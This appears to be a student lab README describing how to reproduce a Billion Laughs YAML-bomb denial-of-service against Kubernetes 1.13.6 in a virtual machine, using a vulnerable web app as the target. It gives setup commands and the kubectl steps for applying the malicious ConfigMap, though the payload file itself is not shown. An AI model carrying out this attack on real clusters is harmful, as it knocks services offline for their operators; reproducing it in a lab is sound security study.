Our project aims to execute a DoS attack on Kubernetes version 1.13.6
The attack is done by creating a ConfigMap that holds a malicious payload - a Billion Laughs attack
We have detailed the steps below necessary to carry out the attack (the attack will be carried out in a Virtual Machine environment)

Step 1: Set Up
Firstly, we must install Docker and the vulnerable Kubernetes version
	$ sudo apt update
	$ sudo apt install docker.io docker-compose
	$ sudo usermod -a -G docker $USER

Then reboot the machine
	$ sudo reboot
	$ groups 	// 'docker' should now be a group

Now, we will install an older version of Kubernetes on our VM
	$ snap install microk8s --classic --channel=1.13/stable
	$ sudo usermod -a -G microk8s $USER

This command will install v1 1.13.6, and can be verified with the command
	$ microk8s.kubectl version

Now, we must start up and enable the registry, dns, and dashboard pods
	$ microk8s.enable registry
	$ microk8s.enable dns
	$ microk8s.enable dashboard

The pods can be verified as up and running using the command
	$ microk8s.kubectl get pods --all-namespaces

Step 2: Pushing DVWA image to Kubernetes
Next, we must create a DVWA image, push it to the Kubernetes registry, and apply webserver and mysql yaml files as pods
To download the Damn Vulnerable Web App open source code from GitHub:
	$ git clone https://github.com/opsxcq/docker-vulnerable-dvwa.git

Then, we replace the Dockerfile and config.inc.php with the new files, and add webserver.yaml, webserver-svc.yaml, mysql.yaml, and mysql-svc.yaml to the directory
	$ docker-compose up

A new DVWA image is now build and composed
	$ docker images 	// you will now see the image name and image id necessary for the next part

Now we tag the image and push it to the kubernetes registry
	$ docker tag <image-id> localhost:32000/<image-name>:k8s
	$ docker push localhost:32000/<image-name>

The next step is to run the web application in Kubernetes to verify that it works
At this point, some users may have to verify that the correct image name is in webserver-svc.yaml and mysql-svc.yaml so that the applied services can properly find the DVWA image
	$ microk8s.kubectl apply -f webserver.yaml
	$ microk8s.kubectl apply -f webserver-svc.yaml
	$ microk8s.kubectl apply -f mysql.yaml
	$ microk8s.kubectl apply -f mysql-svc.yaml

By getting all the pods, we can see the web application running 
	$ microk8s.kubectl get pods --all-namespaces
	$ microk8s.kubectl get services --all-namespaces
	$ docker ps	// too see all running docker containers

Step 3: Creating and deploying the ConfigMap
We now create a ConfigMap within the cluster, and apply it 
A malicious ConfigMap will execute the DoS attack and stop the DVWA application from running
yaml_bomb.yaml is the name of the yaml file that contains the malicious payload, 'yaml-bomb' is the map name specified in yaml_bomb.yaml
	$ microk8s.kubectl create configmap yaml-bomb --from-file=./yaml_bomb.yaml
	$ microk8s.kubectl apply -f yaml_bomb.yaml
	$ microk8s.kubectl describe configmaps yaml-bomb 	// the newly made ConfigMap will print

At this point, if the ConfigMap is malicious, the apply command will hang, and the DVWA application will stop running on localhost
